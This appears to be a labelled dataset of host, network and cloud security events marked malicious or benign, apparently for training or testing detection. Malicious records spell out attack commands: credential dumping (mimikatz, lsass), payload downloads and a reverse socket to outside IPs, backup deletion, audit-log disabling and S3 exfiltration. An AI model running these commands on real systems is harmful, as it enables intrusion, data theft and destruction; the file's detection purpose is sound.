@@ -1,0 +1,957 @@
+[
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-FIN-01",
+    "timestamp": "2026-11-05T08:14:02Z",
+    "extracted_indicators": [
+      "WINWORD.EXE",
+      "cmd.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "cmd.exe",
+      "CommandLine": "cmd.exe /c powershell.exe -enc aW52b2tlLW1pbWlrYXR6",
+      "ParentProcessName": "WINWORD.EXE",
+      "User": "finance_analyst",
+      "ProcessId": 3210
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-FIN-01",
+    "timestamp": "2026-11-05T08:14:05Z",
+    "extracted_indicators": [
+      "powershell.exe",
+      "185.220.101.5"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "powershell.exe",
+      "CommandLine": "powershell.exe -w hidden -enc aW52b2tlLW1pbWlrYXR6 invoke-mimikatz",
+      "ParentProcessName": "cmd.exe",
+      "User": "finance_analyst",
+      "ProcessId": 3214,
+      "Network": {
+        "DestinationIp": "185.220.101.5",
+        "DestinationPort": 443
+      }
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-FIN-01",
+    "timestamp": "2026-11-05T08:14:18Z",
+    "extracted_indicators": [
+      "procdump64.exe",
+      "lsass.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "procdump64.exe",
+      "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp",
+      "ParentProcessName": "powershell.exe",
+      "User": "SYSTEM",
+      "ProcessId": 4892
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-FIN-01",
+    "timestamp": "2026-11-05T08:14:25Z",
+    "extracted_indicators": [
+      "185.220.101.5"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "powershell.exe",
+      "Network": {
+        "DestinationIp": "185.220.101.5",
+        "DestinationPort": 443,
+        "Protocol": "tcp",
+        "BytesSent": 4512000
+      },
+      "User": "finance_analyst"
+    }
+  },
+  {
+    "event_type": "SecurityAuth",
+    "source_dataset": "HOST-DC-01",
+    "timestamp": "2026-11-05T08:20:10Z",
+    "extracted_indicators": [
+      "10.0.1.45"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "EventID": 4769,
+      "ServiceName": "krbtgt",
+      "TicketOptions": "0x40810000",
+      "TicketEncryptionType": "0x17",
+      "ClientAddress": "10.0.1.45",
+      "TargetUserName": "Administrator",
+      "Action": "Kerberoasting TGS Request"
+    }
+  },
+  {
+    "event_type": "ReplicationRpc",
+    "source_dataset": "HOST-DC-01",
+    "timestamp": "2026-11-05T08:20:25Z",
+    "extracted_indicators": [
+      "10.0.1.45",
+      "mimikatz"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "EventID": 4662,
+      "AccessMask": "0x100",
+      "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
+      "SubjectUserName": "compromised_svc",
+      "ClientAddress": "10.0.1.45",
+      "Action": "Directory Service Replication (DCSync)"
+    }
+  },
+  {
+    "event_type": "GroupModification",
+    "source_dataset": "HOST-DC-01",
+    "timestamp": "2026-11-05T08:20:45Z",
+    "extracted_indicators": [
+      "Domain Admins"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "EventID": 4728,
+      "TargetGroupName": "Domain Admins",
+      "MemberName": "CN=backdoor_user,OU=Users,DC=corp,DC=internal",
+      "SubjectUserName": "Administrator",
+      "Action": "Privilege Escalation via Group Addition"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-DC-01",
+    "timestamp": "2026-11-05T08:21:00Z",
+    "extracted_indicators": [
+      "ntdsutil.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "ntdsutil.exe",
+      "CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ifm\" q q",
+      "User": "SYSTEM",
+      "ProcessId": 5104
+    }
+  },
+  {
+    "event_type": "HttpAccess",
+    "source_dataset": "HOST-WEB-PROD",
+    "timestamp": "2026-11-05T08:30:00Z",
+    "extracted_indicators": [
+      "198.51.100.99"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "Uri": "/api/upload/shell.jsp",
+      "HttpMethod": "POST",
+      "ResponseCode": 200,
+      "ClientIp": "198.51.100.99",
+      "UserAgent": "Mozilla/5.0 (Kali Linux) Gecko/20100101 Firefox/91.0"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-WEB-PROD",
+    "timestamp": "2026-11-05T08:30:15Z",
+    "extracted_indicators": [
+      "tomcat.exe",
+      "cmd.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "cmd.exe",
+      "CommandLine": "cmd.exe /c whoami && ipconfig /all",
+      "ParentProcessName": "tomcat.exe",
+      "User": "tomcat_service",
+      "ProcessId": 6120
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-WEB-PROD",
+    "timestamp": "2026-11-05T08:30:30Z",
+    "extracted_indicators": [
+      "certutil.exe",
+      "198.51.100.99"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.99/payload.exe C:\\temp\\payload.exe",
+      "User": "tomcat_service",
+      "ProcessId": 6144
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-WEB-PROD",
+    "timestamp": "2026-11-05T08:30:45Z",
+    "extracted_indicators": [
+      "198.51.100.99"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "payload.exe",
+      "Network": {
+        "DestinationIp": "198.51.100.99",
+        "DestinationPort": 4444,
+        "Protocol": "tcp"
+      },
+      "User": "SYSTEM"
+    }
+  },
+  {
+    "event_type": "CronJobStart",
+    "source_dataset": "HOST-DB-PROD",
+    "timestamp": "2026-11-05T02:00:00Z",
+    "extracted_indicators": [
+      "svc_postgres"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "cron",
+      "CommandLine": "/usr/sbin/cron -f",
+      "JobName": "db_nightly_backup.sh",
+      "User": "root"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-DB-PROD",
+    "timestamp": "2026-11-05T02:00:05Z",
+    "extracted_indicators": [
+      "pg_dumpall"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "pg_dumpall",
+      "CommandLine": "pg_dumpall -U postgres -f /var/backups/postgres_20261105.sql",
+      "User": "svc_postgres",
+      "ProcessId": 14022
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-DB-PROD",
+    "timestamp": "2026-11-05T02:05:30Z",
+    "extracted_indicators": [
+      "gzip"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "gzip",
+      "CommandLine": "gzip -9 /var/backups/postgres_20261105.sql",
+      "User": "svc_postgres",
+      "ProcessId": 14190
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-DB-PROD",
+    "timestamp": "2026-11-05T02:06:15Z",
+    "extracted_indicators": [
+      "10.0.2.20"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "rsync",
+      "CommandLine": "rsync -avz /var/backups/ 10.0.2.20:/nas/db_backups/",
+      "Network": {
+        "DestinationIp": "10.0.2.20",
+        "DestinationPort": 22,
+        "Protocol": "tcp"
+      },
+      "User": "svc_postgres"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-DEV-02",
+    "timestamp": "2026-11-05T09:15:00Z",
+    "extracted_indicators": [
+      "git.exe"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "git.exe",
+      "CommandLine": "git.exe pull origin main --rebase",
+      "User": "dev_alex",
+      "ProcessId": 7180,
+      "Network": {
+        "DestinationIp": "140.82.121.4",
+        "DestinationPort": 443
+      }
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-DEV-02",
+    "timestamp": "2026-11-05T09:15:30Z",
+    "extracted_indicators": [
+      "docker.exe"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "docker.exe",
+      "CommandLine": "docker.exe build -t microservice-auth:v2.4 .",
+      "User": "dev_alex",
+      "ProcessId": 7250
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-DEV-02",
+    "timestamp": "2026-11-05T09:17:10Z",
+    "extracted_indicators": [
+      "npm.cmd"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "npm.cmd",
+      "CommandLine": "npm.cmd test -- --watch=false",
+      "User": "dev_alex",
+      "ProcessId": 7340
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-DEV-02",
+    "timestamp": "2026-11-05T09:18:00Z",
+    "extracted_indicators": [
+      "10.0.5.15"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "docker.exe",
+      "Network": {
+        "DestinationIp": "10.0.5.15",
+        "DestinationPort": 5000,
+        "Protocol": "tcp"
+      },
+      "Action": "Push image to internal Harbor container registry",
+      "User": "dev_alex"
+    }
+  },
+  {
+    "event_type": "LogonSuccess",
+    "source_dataset": "HOST-HR-03",
+    "timestamp": "2026-11-05T08:00:00Z",
+    "extracted_indicators": [
+      "sarah_jenkins"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "EventID": 4624,
+      "LogonType": 2,
+      "TargetUserName": "sarah_jenkins",
+      "WorkstationName": "HOST-HR-03",
+      "AuthenticationPackage": "Kerberos"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-HR-03",
+    "timestamp": "2026-11-05T08:00:15Z",
+    "extracted_indicators": [
+      "OUTLOOK.EXE"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "OUTLOOK.EXE",
+      "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+      "User": "sarah_jenkins",
+      "ProcessId": 4120
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-HR-03",
+    "timestamp": "2026-11-05T08:05:00Z",
+    "extracted_indicators": [
+      "52.114.132.80"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "Teams.exe",
+      "Network": {
+        "DestinationIp": "52.114.132.80",
+        "DestinationPort": 3478,
+        "Protocol": "udp"
+      },
+      "Action": "Microsoft Teams Video Meeting Call",
+      "User": "sarah_jenkins"
+    }
+  },
+  {
+    "event_type": "FileCreate",
+    "source_dataset": "HOST-HR-03",
+    "timestamp": "2026-11-05T08:20:00Z",
+    "extracted_indicators": [
+      "WINWORD.EXE"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "WINWORD.EXE",
+      "FilePath": "C:\\Users\\sarah_jenkins\\OneDrive - Corp\\Q4_Compensation_Plan.docx",
+      "User": "sarah_jenkins"
+    }
+  },
+  {
+    "event_type": "PortScanDetected",
+    "source_dataset": "HOST-GATEWAY-EXT",
+    "timestamp": "2026-11-05T07:10:00Z",
+    "extracted_indicators": [
+      "203.0.113.195"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "SourceIP": "203.0.113.195",
+      "TargetSubnet": "198.51.100.0/24",
+      "PacketCount": 2500,
+      "ScanType": "TCP SYN Stealth Scan",
+      "Action": "Alert generated by Suricata IDS"
+    }
+  },
+  {
+    "event_type": "LogonFailure",
+    "source_dataset": "HOST-GATEWAY-EXT",
+    "timestamp": "2026-11-05T07:12:00Z",
+    "extracted_indicators": [
+      "203.0.113.195",
+      "root"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "EventID": 4625,
+      "TargetUserName": "root",
+      "FailureReason": "Unknown user name or bad password",
+      "ClientIp": "203.0.113.195",
+      "AttemptCount": 85
+    }
+  },
+  {
+    "event_type": "LogonSuccess",
+    "source_dataset": "HOST-GATEWAY-EXT",
+    "timestamp": "2026-11-05T07:13:30Z",
+    "extracted_indicators": [
+      "203.0.113.195",
+      "admin"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "Service": "sshd",
+      "TargetUserName": "admin",
+      "ClientIp": "203.0.113.195",
+      "Action": "Password authentication accepted after multiple failures"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-GATEWAY-EXT",
+    "timestamp": "2026-11-05T07:14:00Z",
+    "extracted_indicators": [
+      "curl",
+      "203.0.113.195"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "curl",
+      "CommandLine": "curl -sL http://203.0.113.195/xmrig.tar.gz -o /tmp/xmrig.tar.gz && tar -xzf /tmp/xmrig.tar.gz -C /tmp",
+      "User": "admin",
+      "ProcessId": 1820
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-GATEWAY-EXT",
+    "timestamp": "2026-11-05T07:14:30Z",
+    "extracted_indicators": [
+      "xmrig"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "xmrig",
+      "CommandLine": "/tmp/xmrig -o pool.supportxmr.com:3333 -u 48edfHu7V9Z8... -p worker1 --cpu-max-threads-hint=100",
+      "User": "admin",
+      "ProcessId": 1845,
+      "Network": {
+        "DestinationIp": "198.51.100.77",
+        "DestinationPort": 3333
+      }
+    }
+  },
+  {
+    "event_type": "LogonSuccess",
+    "source_dataset": "HOST-WS-IT-01",
+    "timestamp": "2026-11-05T03:00:00Z",
+    "extracted_indicators": [
+      "10.0.0.15",
+      "it_admin_dave"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "EventID": 4624,
+      "LogonType": 10,
+      "TargetUserName": "it_admin_dave",
+      "ClientIp": "10.0.0.15",
+      "WorkstationName": "JUMPBOX-IT-01",
+      "Action": "Remote Desktop Maintenance Session"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-WS-IT-01",
+    "timestamp": "2026-11-05T03:02:00Z",
+    "extracted_indicators": [
+      "dsa.msc"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "mmc.exe",
+      "CommandLine": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\dsa.msc\"",
+      "User": "it_admin_dave",
+      "ProcessId": 3812
+    }
+  },
+  {
+    "event_type": "ServiceInstall",
+    "source_dataset": "HOST-WS-IT-01",
+    "timestamp": "2026-11-05T03:10:00Z",
+    "extracted_indicators": [
+      "TrustedInstaller.exe"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "EventID": 7045,
+      "ServiceName": "Windows Modules Installer",
+      "ImagePath": "C:\\Windows\\servicing\\TrustedInstaller.exe",
+      "Action": "Application of cumulative security patch KB5044284",
+      "User": "SYSTEM"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-WS-IT-01",
+    "timestamp": "2026-11-05T03:20:00Z",
+    "extracted_indicators": [
+      "shutdown.exe"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "shutdown.exe",
+      "CommandLine": "shutdown.exe /r /t 60 /c \"Patch maintenance reboot\"",
+      "User": "it_admin_dave",
+      "ProcessId": 3950
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-RND-LAB-01",
+    "timestamp": "2026-11-05T06:00:00Z",
+    "extracted_indicators": [
+      "vssadmin.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "vssadmin.exe",
+      "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+      "ParentProcessName": "invoice_scanner.exe",
+      "User": "SYSTEM",
+      "ProcessId": 8204
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-RND-LAB-01",
+    "timestamp": "2026-11-05T06:00:15Z",
+    "extracted_indicators": [
+      "bcdedit.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "bcdedit.exe",
+      "CommandLine": "bcdedit.exe /set {default} recoveryenabled no",
+      "User": "SYSTEM",
+      "ProcessId": 8210
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-RND-LAB-01",
+    "timestamp": "2026-11-05T06:00:30Z",
+    "extracted_indicators": [
+      "wbadmin.exe"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "wbadmin.exe",
+      "CommandLine": "wbadmin.exe delete catalog -quiet",
+      "User": "SYSTEM",
+      "ProcessId": 8218
+    }
+  },
+  {
+    "event_type": "FileModification",
+    "source_dataset": "HOST-RND-LAB-01",
+    "timestamp": "2026-11-05T06:01:00Z",
+    "extracted_indicators": [
+      "invoice_scanner.exe",
+      ".locked"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "invoice_scanner.exe",
+      "Action": "Mass file renaming to .locked extension (5,400 files affected)",
+      "User": "SYSTEM",
+      "ProcessId": 8200
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-RND-LAB-01",
+    "timestamp": "2026-11-05T06:02:00Z",
+    "extracted_indicators": [
+      "notepad.exe",
+      "README_DECRYPT.txt"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "notepad.exe",
+      "CommandLine": "notepad.exe C:\\Users\\Public\\Desktop\\README_DECRYPT.txt",
+      "User": "SYSTEM",
+      "ProcessId": 8240
+    }
+  },
+  {
+    "event_type": "DeviceConnect",
+    "source_dataset": "HOST-EXEC-LAPTOP",
+    "timestamp": "2026-11-05T10:00:00Z",
+    "extracted_indicators": [
+      "USB\\VID_03EB&PID_2042"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "DeviceID": "USB\\VID_03EB&PID_2042\\5&1123456&0&1",
+      "DeviceDescription": "Generic USB Keyboard (Keystroke Injector Emulation)",
+      "Action": "Rapid 1,200 keystroke sequence triggered within 2 seconds"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-EXEC-LAPTOP",
+    "timestamp": "2026-11-05T10:00:05Z",
+    "extracted_indicators": [
+      "powershell.exe",
+      "45.33.32.156"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "powershell.exe",
+      "CommandLine": "powershell.exe -w hidden -nop -c \"IEX ((New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage1.ps1'))\"",
+      "User": "cfo_mark",
+      "ProcessId": 9102
+    }
+  },
+  {
+    "event_type": "FileAccess",
+    "source_dataset": "HOST-EXEC-LAPTOP",
+    "timestamp": "2026-11-05T10:00:20Z",
+    "extracted_indicators": [
+      "Login Data"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "powershell.exe",
+      "TargetFilePath": "C:\\Users\\cfo_mark\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+      "Action": "Browser credential store SQLite database exfiltration attempt",
+      "User": "cfo_mark"
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-EXEC-LAPTOP",
+    "timestamp": "2026-11-05T10:00:35Z",
+    "extracted_indicators": [
+      "45.33.32.156"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "powershell.exe",
+      "Network": {
+        "DestinationIp": "45.33.32.156",
+        "DestinationPort": 8080,
+        "Protocol": "tcp"
+      },
+      "Action": "POST /upload HTTP/1.1 (Exfiltration payload size 8.4MB)",
+      "User": "cfo_mark"
+    }
+  },
+  {
+    "event_type": "HardwareCheck",
+    "source_dataset": "HOST-STORAGE-SAN",
+    "timestamp": "2026-11-05T01:00:00Z",
+    "extracted_indicators": [
+      "MegaCli64"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "MegaCli64",
+      "CommandLine": "MegaCli64 -LDCC -ProgDsply -LALL -aALL",
+      "Action": "Scheduled hardware RAID controller consistency scrub",
+      "User": "root"
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-STORAGE-SAN",
+    "timestamp": "2026-11-05T01:05:00Z",
+    "extracted_indicators": [
+      "10.0.0.50"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "Service": "snmpd",
+      "Network": {
+        "DestinationIp": "10.0.0.50",
+        "DestinationPort": 161,
+        "Protocol": "udp"
+      },
+      "Action": "Internal Zabbix monitoring poll for SAN disk drive health",
+      "User": "snmp"
+    }
+  },
+  {
+    "event_type": "NfsMount",
+    "source_dataset": "HOST-STORAGE-SAN",
+    "timestamp": "2026-11-05T01:10:00Z",
+    "extracted_indicators": [
+      "10.0.2.10"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ClientIp": "10.0.2.10",
+      "ExportPath": "/mnt/san/volume1",
+      "MountType": "nfs4",
+      "Action": "Authorized NFS mount from primary backup repository"
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-STORAGE-SAN",
+    "timestamp": "2026-11-05T01:30:00Z",
+    "extracted_indicators": [
+      "telemetry.storage-vendor.internal"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "Domain": "telemetry.storage-vendor.internal",
+      "Network": {
+        "DestinationIp": "10.0.1.99",
+        "DestinationPort": 443,
+        "Protocol": "tcp"
+      },
+      "Action": "Automated firmware diagnostic telemetry push",
+      "User": "system"
+    }
+  },
+  {
+    "event_type": "SmtpTrafficSpike",
+    "source_dataset": "HOST-MAIL-RELAY",
+    "timestamp": "2026-11-05T04:00:00Z",
+    "extracted_indicators": [
+      "10.0.1.200"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "Service": "postfix",
+      "ClientIp": "10.0.1.200",
+      "OutboundRecipientCount": 12500,
+      "DurationSeconds": 120,
+      "Action": "Volumetric email relay spike from infected internal printer"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-MAIL-RELAY",
+    "timestamp": "2026-11-05T04:01:10Z",
+    "extracted_indicators": [
+      "perl"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "perl",
+      "CommandLine": "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in(443,inet_aton(\"198.51.100.88\"))); ...'",
+      "User": "postfix",
+      "ProcessId": 19440
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-MAIL-RELAY",
+    "timestamp": "2026-11-05T04:02:00Z",
+    "extracted_indicators": [
+      "198.51.100.88"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "perl",
+      "Network": {
+        "DestinationIp": "198.51.100.88",
+        "DestinationPort": 443,
+        "Protocol": "tcp"
+      },
+      "Action": "Encrypted C2 channel established by spam coordinator botnet",
+      "User": "postfix"
+    }
+  },
+  {
+    "event_type": "ReputationAlert",
+    "source_dataset": "HOST-MAIL-RELAY",
+    "timestamp": "2026-11-05T04:05:00Z",
+    "extracted_indicators": [
+      "Spamhaus"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "Provider": "Spamhaus ZEN",
+      "ListedIp": "203.0.113.10",
+      "Classification": "Active Spam Relay / Exploit Source",
+      "Action": "External RBL blacklist alert received"
+    }
+  },
+  {
+    "event_type": "ScanExecution",
+    "source_dataset": "HOST-SECURITY-SRV",
+    "timestamp": "2026-11-05T05:00:00Z",
+    "extracted_indicators": [
+      "nessusd"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "nessusd",
+      "TargetNetwork": "10.0.3.0/24",
+      "ScanPolicy": "Corporate Weekly Vulnerability Audit",
+      "User": "svc_nessus"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-SECURITY-SRV",
+    "timestamp": "2026-11-05T05:01:00Z",
+    "extracted_indicators": [
+      "MpCmdRun.exe"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "MpCmdRun.exe",
+      "CommandLine": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate",
+      "User": "SYSTEM",
+      "ProcessId": 1104
+    }
+  },
+  {
+    "event_type": "NetworkConnect",
+    "source_dataset": "HOST-SECURITY-SRV",
+    "timestamp": "2026-11-05T05:02:30Z",
+    "extracted_indicators": [
+      "10.0.0.25"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "splunkd.exe",
+      "Network": {
+        "DestinationIp": "10.0.0.25",
+        "DestinationPort": 9997,
+        "Protocol": "tcp"
+      },
+      "Action": "Forwarding encrypted SIEM indexer events",
+      "User": "SYSTEM"
+    }
+  },
+  {
+    "event_type": "ProcessCreate",
+    "source_dataset": "HOST-SECURITY-SRV",
+    "timestamp": "2026-11-05T05:05:00Z",
+    "extracted_indicators": [
+      "certbot"
+    ],
+    "ground_truth_label": "benign",
+    "original_record": {
+      "ProcessName": "certbot",
+      "CommandLine": "certbot renew --non-interactive --post-hook \"systemctl reload nginx\"",
+      "User": "root",
+      "ProcessId": 2189
+    }
+  },
+  {
+    "event_type": "CloudApiCall",
+    "source_dataset": "HOST-CLOUD-JUMP",
+    "timestamp": "2026-11-05T11:00:00Z",
+    "extracted_indicators": [
+      "aws.exe",
+      "s3"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "aws.exe",
+      "CommandLine": "aws s3 sync s3://corp-confidential-bucket/ C:\\exfil_dump\\ --no-sign-request",
+      "User": "compromised_ops",
+      "ProcessId": 15020
+    }
+  },
+  {
+    "event_type": "CloudApiCall",
+    "source_dataset": "HOST-CLOUD-JUMP",
+    "timestamp": "2026-11-05T11:01:00Z",
+    "extracted_indicators": [
+      "aws.exe",
+      "cloudtrail"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "aws.exe",
+      "CommandLine": "aws cloudtrail stop-logging --name Corp-Main-Auditing-Trail",
+      "User": "compromised_ops",
+      "ProcessId": 15034
+    }
+  },
+  {
+    "event_type": "CloudApiCall",
+    "source_dataset": "HOST-CLOUD-JUMP",
+    "timestamp": "2026-11-05T11:02:15Z",
+    "extracted_indicators": [
+      "aws.exe",
+      "ec2"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "aws.exe",
+      "CommandLine": "aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --count 8 --instance-type c5.18xlarge",
+      "User": "compromised_ops",
+      "ProcessId": 15050
+    }
+  },
+  {
+    "event_type": "CloudApiCall",
+    "source_dataset": "HOST-CLOUD-JUMP",
+    "timestamp": "2026-11-05T11:03:00Z",
+    "extracted_indicators": [
+      "aws.exe",
+      "sts"
+    ],
+    "ground_truth_label": "malicious",
+    "original_record": {
+      "ProcessName": "aws.exe",
+      "CommandLine": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/OrganizationAccountAccessRole --role-session-name BackdoorAccess",
+      "User": "compromised_ops",
+      "ProcessId": 15062
+    }
+  }
+]
